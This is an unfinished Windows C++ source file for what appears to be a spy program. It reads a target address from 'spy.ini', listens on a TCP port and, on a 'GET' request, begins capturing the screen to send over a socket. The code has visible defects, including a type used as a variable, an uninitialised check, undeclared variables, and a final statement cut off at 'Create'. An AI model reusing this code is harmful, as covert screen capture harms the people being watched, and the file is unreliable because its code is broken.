#include <windows.h>

struct inidata
{
	char ipad[20];
	int time_interval;
};

char *inifile="spy.ini";
char *section="madhur";
char *sec1="Address";
//char *sec2="Time";

DWORD WINAPI lstproc(void *);
int WINAPI WinMain (HINSTANCE hinst,HINSTANCE dd,LPSTR cmdline,int cmdshow)
{
	WSADATA wsadata;
	char buffer[20];
	int i;
	SOCKET listensocket;
	sockaddr_in sockad;


	WSAStartup(2,&wsadata);
	if(i!=0)
	{
		MessageBox(0,"Winsock Error","Beller",MB_ICONSTOP);
		return 0;
	}
	if(wsadata.wVersion !=2)
	{
		MessageBox(0,"Older Winsock version","Beller",MB_ICONSTOP);
		return 0;
	}

	i=GetPrivateProfileString(section,sec1,0,inidata.ipad ,20,inifile);
	if(i!=0)
	{
		MessageBox(0,"Error","Error",0);
		ExitProcess(0);
	}
	
/*	while(GetMessage(&msg,0,0,0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}*/

//	SetTimer(0,25,100,tproc);

	HANDLE mainthwnd=CreateThread(0,0,lstproc,0,0,0);


	return 1;

}


DWORD WINAPI lstproc(LPVOID h)
{


	SOCKET listensocket,newsocket;
	int i;
	sockaddr_in sockad,newsockad;


	listensocket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	if(listensocket==INVALID_SOCKET)
	{
		MessageBox(0,"Cannot Create Socket","Beller",MB_ICONSTOP);
		ExitProcess(0);
	}

	sockad.sin_addr.S_un.S_addr  =INADDR_ANY;
	sockad.sin_port =htons(4445);		//listening on port 4444
	sockad.sin_family =AF_INET  ;

	i=bind(listensocket,reinterpret_cast<sockaddr*>(&sockad),sizeof(sockad));

	if(i==INVALID_SOCKET)
	{
		MessageBox(0,"Socket Binding Error","Beller",MB_ICONSTOP);
		ExitProcess(0);
	}

	i=listen(listensocket,SOMAXCONN);
	if(i==INVALID_SOCKET)
	{
		MessageBox(0,"Cannot Listen Socket","Beller",MB_ICONSTOP);
		ExitProcess(0);
	}

	i=sizeof(newsockad);

	while(1)
	{
		newsocket=accept(listensocket,reinterpret_cast<sockaddr*>(&newsockad),&i);
		if(newsocket==INVALID_SOCKET)
		{
			MessageBox(0,"Error in accepting incoming connection","Beller",MB_ICONSTOP);
			ExitProcess(0);
		}


		retval=recv(int(newsock),buffer,4,0);
		i=strcmp(buffer,"GET");
		if(i==0)
		{
			sendimage();
		}


	}

	closesocket(listensocket);


}


sendimage()
{
	
	HDC hdc=GetWindowDC(0);
	HDC mhdc=Create
	SOCKET sendsocket;
	sendsocket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);



		

